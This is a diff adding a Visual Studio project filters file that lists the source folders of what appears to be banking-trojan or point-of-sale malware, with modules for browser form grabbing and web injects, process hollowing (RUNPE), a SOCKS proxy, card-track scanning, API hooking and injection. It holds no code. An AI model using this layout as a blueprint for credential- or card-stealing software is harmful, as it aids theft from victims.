@@ -1,0 +1,243 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="Source Files\HTTP">
+      <UniqueIdentifier>{98cee243-77b6-44d2-b9be-65c653adb964}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Core">
+      <UniqueIdentifier>{061b515a-837b-48bb-a9aa-c9fe4f88156f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\crypto">
+      <UniqueIdentifier>{e39d999f-16ed-4349-9870-b99000f5e0a1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\HTTP">
+      <UniqueIdentifier>{b0e205d8-7312-429e-afdf-ab0f79c781ae}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\core">
+      <UniqueIdentifier>{6f187f44-71bd-48a2-a374-b8d54a372e32}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\crypto">
+      <UniqueIdentifier>{80af30b7-29d5-4bea-a4b2-def2a9d36581}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\CONFIG">
+      <UniqueIdentifier>{d0312a44-0f7e-472c-bcd9-a435aeef2247}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\CONFIG">
+      <UniqueIdentifier>{83cd21ad-8fe3-4751-8d93-5d3d61fe4895}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\PLUGINS">
+      <UniqueIdentifier>{4fe682ea-3ae9-4575-a35f-e3ef124619a8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\PLUGINS\SOCKS">
+      <UniqueIdentifier>{44c110e7-ad81-4962-a0c1-1ac4618c47a1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\PLUGINS\RUNPE">
+      <UniqueIdentifier>{e22cee6b-72a1-4e18-80e5-26ebe3886f64}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\PLUGINS\stdlib">
+      <UniqueIdentifier>{f7cc7915-3d7c-4f0d-a7a6-e27157de8c1b}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\PLUGINS\FormGrab">
+      <UniqueIdentifier>{45271eb0-6588-4ed1-9454-3ecd53c20f58}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\PLUGINS">
+      <UniqueIdentifier>{d4017744-d8e3-4edf-9a4c-4f54fb41d360}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\PLUGINS\SOCKS">
+      <UniqueIdentifier>{a0c4179c-d68b-4b9c-a23a-838c7bc1929a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\PLUGINS\stdlib">
+      <UniqueIdentifier>{70e0acc9-dec5-4472-84a1-3540532ceeb8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\PLUGINS\RUNPE">
+      <UniqueIdentifier>{49fa3e4d-bcb7-4d90-a6f4-d6af1fbbf229}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\PLUGINS\Download">
+      <UniqueIdentifier>{98d4c71c-e942-4695-bed2-31c40ba9e051}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\PLUGINS\formgrabber">
+      <UniqueIdentifier>{b045f9f3-1a57-400c-8549-3f110a11b623}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\PLUGINS\Download">
+      <UniqueIdentifier>{0b7b791a-f93d-4e5d-96c5-a191cac21723}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\PoS Plugin">
+      <UniqueIdentifier>{c89d8079-941e-4098-ae5d-0795ad37cc74}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\JSON">
+      <UniqueIdentifier>{d4657ec4-750f-44ba-9521-c8a23702e554}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\JSON">
+      <UniqueIdentifier>{857c5dba-635c-4553-8fc3-e65c285c2e72}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\minhook">
+      <UniqueIdentifier>{1e3bff99-ca5d-4aa1-ab5d-56f5d98a790a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\minhook\src">
+      <UniqueIdentifier>{63b0ae3e-40be-42aa-8f90-59cbae65b92d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\minhook">
+      <UniqueIdentifier>{8f9b1869-e81d-42c4-be1b-57cc55ee7596}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\POS Plugin">
+      <UniqueIdentifier>{79b8cd49-903e-4b39-bd17-a499189c84c4}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\minhook\src\HDE">
+      <UniqueIdentifier>{8764e5ee-acc4-4b7a-b3ef-9d24da8ad612}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="http.h">
+      <Filter>Header Files\HTTP</Filter>
+    </ClInclude>
+    <ClInclude Include="stdlib.h">
+      <Filter>Header Files\PLUGINS\stdlib</Filter>
+    </ClInclude>
+    <ClInclude Include="core.h">
+      <Filter>Header Files\core</Filter>
+    </ClInclude>
+    <ClInclude Include="Download\download.h">
+      <Filter>Header Files\PLUGINS\Download</Filter>
+    </ClInclude>
+    <ClInclude Include="Config.h">
+      <Filter>Header Files\CONFIG</Filter>
+    </ClInclude>
+    <ClInclude Include="RUNPE\runpe.h">
+      <Filter>Header Files\PLUGINS\RUNPE</Filter>
+    </ClInclude>
+    <ClInclude Include="RUNPE\rundll.h">
+      <Filter>Header Files\PLUGINS\RUNPE</Filter>
+    </ClInclude>
+    <ClInclude Include="socks\socks.h">
+      <Filter>Header Files\PLUGINS\SOCKS</Filter>
+    </ClInclude>
+    <ClInclude Include="PoS\scan.h">
+      <Filter>Header Files\POS Plugin</Filter>
+    </ClInclude>
+    <ClInclude Include="PoS\tracks.h">
+      <Filter>Header Files\POS Plugin</Filter>
+    </ClInclude>
+    <ClInclude Include="JSON\JSON.h">
+      <Filter>Header Files\JSON</Filter>
+    </ClInclude>
+    <ClInclude Include="formgrab\headers.h">
+      <Filter>Header Files\PLUGINS\formgrabber</Filter>
+    </ClInclude>
+    <ClInclude Include="crypt.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="ftpserv.h">
+      <Filter>Source Files</Filter>
+    </ClInclude>
+    <ClInclude Include="minhook\include\minhook.h">
+      <Filter>Source Files\minhook</Filter>
+    </ClInclude>
+    <ClInclude Include="minhook\src\buffer.h">
+      <Filter>Header Files\minhook</Filter>
+    </ClInclude>
+    <ClInclude Include="minhook\src\trampoline.h">
+      <Filter>Header Files\minhook</Filter>
+    </ClInclude>
+    <ClInclude Include="minhook\src\hde\hde32.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="minhook\src\hde\hd64.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="minhook\src\hde\pstdint.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="minhook\src\hde\table32.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="minhook\src\hde\table64.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="main.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="core.c">
+      <Filter>Source Files\Core</Filter>
+    </ClCompile>
+    <ClCompile Include="Registery.c">
+      <Filter>Source Files\Core</Filter>
+    </ClCompile>
+    <ClCompile Include="stdlib.c">
+      <Filter>Source Files\PLUGINS\stdlib</Filter>
+    </ClCompile>
+    <ClCompile Include="Download\download.c">
+      <Filter>Source Files\PLUGINS\Download</Filter>
+    </ClCompile>
+    <ClCompile Include="RUNPE\runpe.c">
+      <Filter>Source Files\PLUGINS\RUNPE</Filter>
+    </ClCompile>
+    <ClCompile Include="RUNPE\rundll.c">
+      <Filter>Source Files\PLUGINS\RUNPE</Filter>
+    </ClCompile>
+    <ClCompile Include="socks\socks.c">
+      <Filter>Source Files\PLUGINS\SOCKS</Filter>
+    </ClCompile>
+    <ClCompile Include="PoS\scan.c">
+      <Filter>Source Files\PoS Plugin</Filter>
+    </ClCompile>
+    <ClCompile Include="PoS\tracks.c">
+      <Filter>Source Files\PoS Plugin</Filter>
+    </ClCompile>
+    <ClCompile Include="HTTP.c">
+      <Filter>Source Files\HTTP</Filter>
+    </ClCompile>
+    <ClCompile Include="JSON\JSON.c">
+      <Filter>Source Files\JSON</Filter>
+    </ClCompile>
+    <ClCompile Include="formgrab\webinject.c">
+      <Filter>Source Files\PLUGINS\FormGrab</Filter>
+    </ClCompile>
+    <ClCompile Include="Firefox.c">
+      <Filter>Source Files\PLUGINS\FormGrab</Filter>
+    </ClCompile>
+    <ClCompile Include="formgrab\headers.c">
+      <Filter>Source Files\PLUGINS\FormGrab</Filter>
+    </ClCompile>
+    <ClCompile Include="formgrab\InternetExplorer.c">
+      <Filter>Source Files\PLUGINS\FormGrab</Filter>
+    </ClCompile>
+    <ClCompile Include="Crypt.c">
+      <Filter>Source Files\PLUGINS</Filter>
+    </ClCompile>
+    <ClCompile Include="FTP.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="minhook\src\buffer.c">
+      <Filter>Source Files\minhook\src</Filter>
+    </ClCompile>
+    <ClCompile Include="minhook\src\hook.c">
+      <Filter>Source Files\minhook\src</Filter>
+    </ClCompile>
+    <ClCompile Include="minhook\src\trampoline.c">
+      <Filter>Source Files\minhook\src</Filter>
+    </ClCompile>
+    <ClCompile Include="minhook\src\hde\hde32.c">
+      <Filter>Source Files\minhook\src\HDE</Filter>
+    </ClCompile>
+    <ClCompile Include="minhook\src\hde\hde64.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="minhook\src\hde\Inject.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+  </ItemGroup>
+</Project>
